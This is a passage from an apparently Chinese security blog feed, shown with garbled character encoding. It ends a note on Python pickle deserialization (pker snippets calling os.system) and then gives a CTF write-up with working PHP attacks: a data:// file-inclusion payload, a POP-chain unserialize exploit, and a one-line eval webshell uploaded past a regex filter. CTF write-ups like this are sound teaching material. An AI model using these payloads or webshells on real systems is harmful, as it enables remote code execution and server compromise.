title="pkerï¼šå…¨å±€å˜é‡è¦†ç›–"></a>pkerï¼šå…¨å±€å˜é‡è¦†ç›–</h4><ul><li>è¦†ç›–ç›´æ¥ç”±æ‰§è¡Œæ–‡ä»¶å¼•å…¥çš„<code>secret</code>æ¨¡å—ä¸­çš„<code>name</code>ä¸<code>category</code>å˜é‡ï¼š</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">secret</span>=GLOBAL(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;secret&#x27;</span>) <br><span class="hljs-comment"># pythonçš„æ‰§è¡Œæ–‡ä»¶è¢«è§£æä¸º__main__å¯¹è±¡ï¼Œsecretåœ¨è¯¥å¯¹è±¡ä»å±ä¸‹</span><br><span class="hljs-attr">secret.name</span>=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-attr">secret.category</span>=<span class="hljs-string">&#x27;2&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>è¦†ç›–å¼•å…¥æ¨¡å—çš„å˜é‡ï¼š</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">game</span> = GLOBAL(<span class="hljs-string">&#x27;guess_game&#x27;</span>, <span class="hljs-string">&#x27;game&#x27;</span>)<br><span class="hljs-attr">game.curr_ticket</span> = <span class="hljs-string">&#x27;123&#x27;</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šç»™å‡ºä¸€äº›å…·ä½“çš„åŸºæœ¬æ“ä½œçš„å®ä¾‹ã€‚</p><h4 id="pkerï¼šå‡½æ•°æ‰§è¡Œ"><a href="#pkerï¼šå‡½æ•°æ‰§è¡Œ" class="headerlink" title="pkerï¼šå‡½æ•°æ‰§è¡Œ"></a>pkerï¼šå‡½æ•°æ‰§è¡Œ</h4><ul><li>é€šè¿‡<code>b&#39;R&#39;</code>è°ƒç”¨ï¼š</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">s<span class="hljs-operator">=</span><span class="hljs-string">&#x27;whoami&#x27;</span><br><span class="hljs-keyword">system</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-keyword">system</span>(s) # `b<span class="hljs-string">&#x27;R&#x27;</span>`è°ƒç”¨<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><ul><li>é€šè¿‡<code>b&#39;i&#39;</code>è°ƒç”¨ï¼š</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><ul><li>é€šè¿‡<code>b&#39;c&#39;</code>ä¸<code>b&#39;o&#39;</code>è°ƒç”¨ï¼š</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)</span></span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>å¤šå‚æ•°è°ƒç”¨å‡½æ•°</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>[, par0,par1...])</span></span><br><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>)</span></span><span class="hljs-selector-attr">[, par0,par1...]</span>)<br></code></pre></td></tr></table></figure><h4 id="pkerï¼šå®ä¾‹åŒ–å¯¹è±¡"><a href="#pkerï¼šå®ä¾‹åŒ–å¯¹è±¡" class="headerlink" title="pkerï¼šå®ä¾‹åŒ–å¯¹è±¡"></a>pkerï¼šå®ä¾‹åŒ–å¯¹è±¡</h4><ul><li>å®ä¾‹åŒ–å¯¹è±¡æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°æ‰§è¡Œ</li></ul><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autoit">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br><br><br><span class="hljs-meta"># æˆ–è€…</span><br><br>animal = OBJ(<span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>), <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><ul><li>å…¶ä¸­ï¼ŒpythonåŸæ–‡ä»¶ä¸­åŒ…å«ï¼š</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, name, category</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.category = category<br></code></pre></td></tr></table></figure><ul><li>ä¹Ÿå¯ä»¥å…ˆå®ä¾‹åŒ–å†èµ‹å€¼ï¼š</li></ul><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>)<br>animal.name=<span class="hljs-string">&#x27;1&#x27;</span><br>animal.category=<span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><h4 id="æ‰‹åŠ¨è¾…åŠ©"><a href="#æ‰‹åŠ¨è¾…åŠ©" class="headerlink" title="æ‰‹åŠ¨è¾…åŠ©"></a>æ‰‹åŠ¨è¾…åŠ©</h4><ul><li>æ‹¼æ¥opcodeï¼šå°†ç¬¬ä¸€ä¸ªpickleæµç»“å°¾è¡¨ç¤ºç»“æŸçš„<code>.</code>å»æ‰ï¼Œä¸¤è€…æ‹¼æ¥èµ·æ¥å³å¯ã€‚</li><li>å»ºç«‹æ™®é€šçš„ç±»æ—¶ï¼Œå¯ä»¥å…ˆpickle.dumpsï¼Œå†æ‹¼æ¥è‡³payloadã€‚</li></ul><p>å‚è€ƒï¼š</p><p><a href="https://xz.aliyun.com/news/7032">https://xz.aliyun.com/news/7032</a> å…ˆçŸ¥å¤§ä½¬</p><p><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> å®˜æ–¹æ–‡æ¡£</p><p><a href="https://tttang.com/archive/1294/">https://tttang.com/archive/1294/</a> Pç¥</p>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pickle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¯èˆªæ¯</title>
    <link href="/2025/01/25/%E5%90%AF%E8%88%AA%E6%9D%AF/"/>
    <url>/2025/01/25/%E5%90%AF%E8%88%AA%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="å¯èˆªæ¯2025-1-25"><a href="#å¯èˆªæ¯2025-1-25" class="headerlink" title="å¯èˆªæ¯2025.1.25"></a>å¯èˆªæ¯2025.1.25</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡æ­£å¼æ¯”èµ›akwebå•Š  å‘œå‘œå‘œ è™½ç„¶å¤šä¸éš¾</p><h3 id="Easy-include"><a href="#Easy-include" class="headerlink" title="Easy_include"></a>Easy_include</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))<br>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>,<span class="hljs-variable">$file</span>))<br>    &#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;no no no ~ &quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç®€å•çš„æ–‡ä»¶åŒ…å«</p><p>payload:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">file</span>=data://text/plain<span class="hljs-comment">;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=</span><br></code></pre></td></tr></table></figure><p>ä¼ªåè®®åŠ ç¼–ç ç»•è¿‡</p><h3 id="Web-pop"><a href="#Web-pop" class="headerlink" title="Web_pop"></a>Web_pop</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$func</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to QHCTF 2025, &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;CTFers&quot;</span>;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun</span>, <span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cla = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$var</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç®€å•çš„pop</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun</span>, <span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cla = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$var</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br><br><br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$a</span>-&gt;name=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Easy</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">eeee</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>-&gt;obj-&gt;func=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="PCREMagic"><a href="#PCREMagic" class="headerlink" title="PCREMagic"></a>PCREMagic</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?php.*?eval.*?\(.*?\).*?\?&gt;/is&#x27;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>));<br>&#125;<br><br><span class="hljs-variable">$user_dir</span> = <span class="hljs-string">&#x27;data/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_php</span>(<span class="hljs-variable">$data</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;bad request&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$user_dir</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$user_dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$user_dir</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">random_int</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>) . <span class="hljs-string">&#x27;.php&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$path</span>);<br><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$path</span>&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">303</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯è¿‡æ»¤ç”¨çš„æ˜¯éè´ªå©ªè¿‡æ»¤</p><p>ç›´æ¥ç»•è¿‡å°±è¡Œ</p><p>webshell:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br><br></code></pre></td></tr></table></figure><p>å†™ä¸ªè¡¨å•ä¸Šä¼ </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æ–‡ä»¶ä¸Šä¼ <span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>ä¸Šä¼ æ–‡ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://challenge.qihangcup.cn:33406/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>é€‰æ‹©æ–‡ä»¶ï¼š<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>ä¸Šä¼ æ–‡ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>èšå‰‘ç›´æ¥è¿æ¥å°±è¡Œ</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy_RSA"></a>Easy_RSA</h3><p>gptç›´æ¥æœ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_OAEP<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_message</span>(<span class="hljs-params">encrypted_message_b64, private_key</span>):<br>    <span class="hljs-comment"># Base64è§£ç åŠ 